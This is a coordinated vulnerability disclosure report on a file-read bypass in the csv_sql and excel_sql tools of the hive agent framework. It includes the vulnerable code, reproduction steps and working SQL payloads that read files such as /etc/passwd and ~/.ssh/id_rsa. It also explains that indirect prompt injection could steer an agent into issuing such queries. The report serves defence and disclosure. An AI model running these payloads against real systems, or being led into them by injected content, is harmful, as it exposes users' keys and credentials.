# Security report (submitted 2026-11-04)

> Written for: the hive maintainer (Aden). hive's SECURITY.md asks that vulnerabilities be
> reported by email to **contact@adenhq.com** (not via public issues) and grants a safe-harbor
> for good-faith research. It asks each report to contain four things — a description, steps to
> reproduce, impact, and mitigations — so this report is structured to match.
> **Status: validated 2026-11-03; submitted to the maintainer on 2026-11-04; CVE pending, not
> guaranteed.** This is the local working copy, so the submitted text may differ. Under embargo
> until the fix or 2027-02-02.

**To:** contact@adenhq.com
**Subject:** Arbitrary local file read in the `csv_sql` MCP tool (DuckDB table functions bypass the SELECT-only guard and the `~/.hive` sandbox)
**Reporter:** genossecurity · **Disclosure policy:** 90-day coordinated
**Affected:** `hive` (aden-hive/hive), `aden_tools` package — `csv_sql` tool (and `excel_sql`,
same root cause). Versions ≤ 1.0.14 (current; HEAD `4ede549`, 2026-11-02); the unguarded
`:memory:` connection is present at least since v0.5.0 (sha `b0e2dac`). No fix as of this writing.

---

## 1. A description of the vulnerability
The `csv_sql` tool runs a model-supplied SQL `query` against DuckDB. It applies two controls:

1. the `path` argument is confined to `~/.hive` / `exports/` by `resolve_safe_path()` — which is
   itself correct (`Path.resolve()` + `startswith(root + os.sep)`, symlink-safe); and
2. the `query` is gated "Only SELECT queries are allowed for security reasons": it must start
   with `SELECT`/`WITH`, a `_WRITE_PATTERN` blocks `INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|
   TRUNCATE|EXEC|EXECUTE`, and `;`, `--`, `/*`, `*/` are rejected.

The problem is that the query runs on `duckdb.connect(":memory:")` with **no**
`enable_external_access=false` / `disabled_filesystems` set. DuckDB's file-reading **table
functions** — `read_text`, `read_csv_auto`, `read_blob`, `glob` — are ordinary `SELECT`s, so they
are not stopped by the SELECT-only guard, and they name the local filesystem directly, so they are
not subject to `resolve_safe_path` (which only guards the `path` argument). A model-supplied query
therefore bypasses **both** controls and reads any file the agent process can access, outside the
`~/.hive` sandbox.

Affected code — `tools/src/aden_tools/tools/csv_tool/csv_tool.py`, `csv_sql(path, query)`
(registered via `@mcp.tool()` in `register_tools`):

```python
query_upper = query.lstrip().upper()
if not (query_upper.startswith("SELECT") or query_upper.startswith("WITH")):
    return {"error": "Only SELECT queries are allowed for security reasons"}
_WRITE_PATTERN = re.compile(r"\b(INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|TRUNCATE|EXEC|EXECUTE)\b", re.I)
if _WRITE_PATTERN.search(query):            # write keywords blocked
    ...
for token in [";", "--", "/*", "*/"]:       # stacked statements / comments blocked
    ...
con = duckdb.connect(":memory:")            # <-- no enable_external_access=false / disabled_filesystems
con.execute("CREATE TABLE data AS SELECT * FROM read_csv_auto(?)", [str(secure_path)])
result = con.execute(query)                 # model-supplied query; file-read funcs allowed
```

`excel_tool.py`'s `excel_sql` has the same unguarded `:memory:` connection and SELECT-only guard —
same root cause, same fix.

Note: this is distinct from the previously-fixed csv_sql issue (#1408 and related), which was SQL
injection via a quote in the CSV **path**, fixed by parameter-binding `read_csv_auto(?)`. That fix
*added* the SELECT-only guard on the assumption that it made query bodies safe; this report is
about the query body calling file-read functions, which that guard does not cover. No published
GHSA covers this vector.

## 2. Steps to reproduce the issue
Tested locally against a self-hosted checkout; benign canary only; no third-party systems.
`poc.py` and the captured output `run-transcript.txt` are in this directory.

1. The only precondition is a valid `.csv` under `~/.hive` so the `path` check passes. The model
   can create one itself with the sibling `csv_write` tool; for a manual repro:
   ```
   mkdir -p ~/.hive && printf 'a,b\n1,2\n' > ~/.hive/data.csv
   ```
2. Place a sentinel file **outside** the sandbox to stand in for a secret (benign marker only):
   ```
   printf 'CANARY-OUTSIDE-SANDBOX' > ~/not_in_hive_canary.txt
   ```
3. Invoke `csv_sql` with an in-sandbox `path` and a crafted `query` that reads the outside file
   via a DuckDB table function:
   ```json
   {
     "name": "csv_sql",
     "arguments": {
       "path": "~/.hive/data.csv",
       "query": "SELECT content FROM read_text('/home/<user>/not_in_hive_canary.txt')"
     }
   }
   ```
4. Observed: the query passes the SELECT-only guard and returns the file's contents in `rows`.
   Other payloads that work the same way:
   ```
   SELECT * FROM read_csv_auto('/etc/passwd')
   SELECT file FROM glob('/**')
   SELECT content FROM read_text('/home/<user>/.ssh/id_rsa')
   ```

`poc.py` reproduces this by lifting the SELECT-only guard verbatim and running it with a real
`duckdb` connection: `SELECT content FROM read_text('<file outside ~/.hive>')` passes the guard and
returns the benign canary's contents (transcript in `run-transcript.txt`).

## 3. Potential impact of the vulnerability
Arbitrary local file read with the agent process's own authority, escaping the declared `~/.hive`
sandbox — e.g. SSH private keys, `.env` / credential files, `~/.hive/configuration.json`, source
code, `/etc/passwd`. The realistic delivery is indirect prompt injection: untrusted content the
agent ingests (a web page, a document, another tool's output) steers the model into emitting the
crafted `query`, so no direct access to the host is required. The impact is confidentiality-only
and read-only: the write-keyword, `COPY`, and stacked-statement blocks hold, so a default DuckDB
`SELECT` on this path does not give write or code execution.

Self-assessed CVSS 3.1: `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N` = **6.5 (Medium)** — rising to 7.5
(High) if the agent ingests attacker content with no operator action (`UI:N`), or ~7.4 if the
sandbox escape is scored as a scope change (`S:C`). See `cvss.md`.

## 4. Possible mitigations
Lock the DuckDB connection down so a query cannot name the local filesystem at all:

```python
con = duckdb.connect(":memory:")
con.execute("CREATE TABLE data AS SELECT * FROM read_csv_auto(?)", [str(secure_path)])  # trusted, confined path
con.execute("SET enable_external_access=false")   # or: SET disabled_filesystems='LocalFileSystem'
result = con.execute(query)                        # untrusted query can no longer read files
```

Set the restriction **after** the trusted `read_csv_auto(?)` load of the confined `secure_path`
(so the legitimate CSV still loads) but **before** executing the untrusted `query`. Apply the
identical fix to `excel_sql` in `excel_tool.py`. A weaker alternative is an allowlist of permitted
table functions, but disabling external access is simpler and closes the whole class.

As an interim operator workaround, run the agent only against trusted content, and avoid granting
the `spreadsheet_advanced` tool category (which includes `csv_sql` / `excel_sql`) to agents that
process untrusted input.

---

## References
- `../verdicts.md` — batch-6 analysis and the dedup distinguishing this from the #1408
  path-injection class.
- `poc.py`, `run-transcript.txt`, `poc.pdf` — reproduction.
- `cvss.md` — scoring and sensitivity notes.
